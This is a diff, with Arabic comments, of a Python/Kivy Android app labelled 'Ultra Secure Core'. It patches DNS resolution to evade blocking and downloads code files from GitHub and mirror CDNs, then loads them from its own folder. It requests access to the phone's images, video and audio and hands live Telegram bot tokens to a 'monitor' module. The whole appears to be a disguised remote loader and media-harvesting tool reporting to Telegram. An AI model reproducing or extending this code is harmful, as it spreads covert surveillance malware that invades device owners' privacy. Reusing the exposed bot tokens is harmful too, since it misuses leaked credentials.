@@ -23,8 +23,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # ========== 1. تجاوز DNS: ربط الأسماء بعناوين IP ثابتة ==========
 def _patch_dns():
     """
-    تخدع مكتبة socket لتربط raw.githubusercontent.com و cdn.jsdelivr.net
-    بعناوين IP حقيقية دون الحاجة لاستعلام DNS.
+    تخدع مكتبة socket لتربط النطاقات المحظورة بعناوين IP حقيقية دون الحاجة لاستعلام DNS.
     """
     original_getaddrinfo = socket.getaddrinfo
 
@@ -32,7 +31,7 @@ def _patch_dns():
         # قائمة الأسماء التي نريد تجاوزها مع عناوين IP المقابلة
         override = {
             'raw.githubusercontent.com': [
-                '185.199.108.133',  # عنوان IP ثابت لـ GitHub
+                '185.199.108.133',
                 '185.199.109.133',
                 '185.199.110.133',
                 '185.199.111.133'
@@ -41,14 +40,17 @@ def _patch_dns():
                 '151.101.2.229',
                 '151.101.66.229',
                 '151.101.130.229'
+            ],
+            'zaen1993.github.io': [          # ✅ إضافة النطاق الشخصي (GitHub Pages)
+                '185.199.108.153',
+                '185.199.109.153',
+                '185.199.110.153',
+                '185.199.111.153'
             ]
         }
         if host in override:
-            # اختيار IP عشوائي من القائمة لتوزيع الحمل
             fake_ip = random.choice(override[host])
-            # إرجاع نتيجة وهمية (AF_INET = IPv4, SOCK_STREAM = TCP)
             return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
-        # للمضيفات الأخرى، استخدم الدالة الأصلية
         return original_getaddrinfo(host, port, family, type, proto, flags)
 
     socket.getaddrinfo = patched_getaddrinfo
@@ -62,7 +64,7 @@ INDEX_URLS = [
     "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json",         # مرآة kkgithub
     "https://jsd.cdn.zzko.cn/gh/Zaen1993/Android-Core@main/index.json",       # CDN صيني سريع
     "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",      # jsDelivr
-    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"  # الرابط الأصلي
+    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"
 ]
 
 # رأسيات HTTP تحاكي متصفح حقيقي
@@ -84,13 +86,14 @@ def _get_path():
     os.makedirs(p, exist_ok=True)
     return p
 
-R = _get_path()                     # المجلد الرئيسي للتشغيل
-U = os.path.join(R, "updates")      # مجلد التحميل المؤقت
+R = _get_path()
+U = os.path.join(R, "updates")
 os.makedirs(U, exist_ok=True)
 
 if R not in sys.path:
     sys.path.insert(0, R)
 
+# ========== دالة طلب الأذونات ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -111,14 +114,14 @@ def _perms():
             "android.permission.READ_MEDIA_VIDEO",
             "android.permission.READ_MEDIA_AUDIO"
         ])
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"Permissions error: {e}")
 
 # ========== 4. تطبيق Kivy الرئيسي ==========
 class CoreApp(App):
     def build(self):
-        _perms()
-        self.title = "System Core v3.5 (Anti-Block)"
+        # تم نقل استدعاء _perms() إلى _run() لتجنب مشاكل التوقيت
+        self.title = "Ultra Secure Core v5.0.2"
         layout = BoxLayout(orientation='vertical', spacing=5)
 
         self.log = TextInput(
@@ -180,15 +183,12 @@ class CoreApp(App):
         tmp_path = os.path.join(U, filename)
         final_path = os.path.join(R, filename)
 
-        # بناء قائمة من الروابط المحتملة للملف الواحد
         candidates = [url]
-        # إذا كان الرابط من raw.githubusercontent، أضف بدائل jsdelivr و kkgithub
         if "raw.githubusercontent.com" in url:
             candidates.append(url.replace("raw.githubusercontent.com", "cdn.jsdelivr.net/gh").replace("/refs/heads/main", "@main"))
             candidates.append(url.replace("raw.githubusercontent.com", "raw.kkgithub.com"))
-        # إذا كان الرابط من cdn.jsdelivr.net، احتفظ به أيضاً
         elif "cdn.jsdelivr.net" in url:
-            candidates.append(url)  # لا حاجة لتغيير
+            candidates.append(url)
 
         for attempt in range(3):
             for current_url in candidates:
@@ -218,7 +218,9 @@ class CoreApp(App):
         threading.Thread(target=self._run, daemon=True).start()
 
     def _run(self):
-        self._log("🚀 System Core v3.5 (Anti-Block Mode) starting...", "BOOT")
+        # ✅ طلب الأذونات في بداية خيط التشغيل (بعد أن يكون التطبيق قد استقر)
+        _perms()
+        self._log("🚀 Ultra Secure Core (Anti-Block Mode) starting...", "BOOT")
 
         # --- 1. جلب قائمة الملفات من index.json ---
         all_files = []
@@ -238,7 +240,7 @@ class CoreApp(App):
         else:
             self._log("⚠️ Could not fetch index.json. Using cached files if any.", "WARN")
 
-        # --- 2. تحميل كل الملفات المذكورة في index (ما عدا main.py) ---
+        # --- 2. تحميل الملفات ---
         for file_url in all_files:
             filename = file_url.split('/')[-1]
             if filename == "main.py":
@@ -276,7 +278,6 @@ class CoreApp(App):
             UI_Class = getattr(telegram_ui, 'T', None)
             if UI_Class:
                 mon = monitor.M()
-                # تعيين التوكنات والقنوات
                 mon.bots = [
                     "7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",
                     "8113293244:AAFFwTHZ5GkoV3DN88jeU8XuMhJf0KLTsf4",
